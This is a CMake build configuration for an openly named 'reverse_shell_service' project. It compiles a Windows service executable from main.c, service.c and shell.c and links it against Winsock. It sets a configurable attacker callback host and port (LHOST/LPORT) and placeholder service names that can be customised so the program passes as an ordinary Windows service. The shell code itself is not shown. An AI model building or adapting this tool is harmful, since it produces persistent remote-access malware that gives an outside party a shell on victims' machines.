project(reverse_shell_service)

set(SERVER_HOST "localhost" CACHE STRING "LHOST (default: localhost)")
set(SERVER_PORT "1234"      CACHE STRING "LPORT (default: 1234)")

set(SERVICE_NAME "svcname"      CACHE STRING "Backend name of service (default: svcname)")
set(DISPLAY_NAME "Service Name" CACHE STRING "Pretty name of service, for UI (default: Service Name)")

message("SERVER_HOST: ${SERVER_HOST}\nSERVER_PORT: ${SERVER_PORT}")

add_compile_definitions(UNICODE
                        WIN32_LEAN_AND_MEAN # exclude rarely used stuff
                        # L's before strings to tell windows API it's a wide char string
                        SERVER_HOST=L"${SERVER_HOST}"
                        SERVER_PORT=L"${SERVER_PORT}"
                        SERVICE_NAME=L"${SERVICE_NAME}"
                        DISPLAY_NAME=L"${DISPLAY_NAME}")

set(CMAKE_C_FLAGS_DEBUG   "${CMAKE_C_FLAGS_DEBUG} /MTd")
set(CMAKE_C_FLAGS_RELEASE "${CMAKE_C_FLAGS_RELEASE} /MT")

add_executable(svc main.c service.c shell.c)

target_link_libraries(svc Ws2_32)
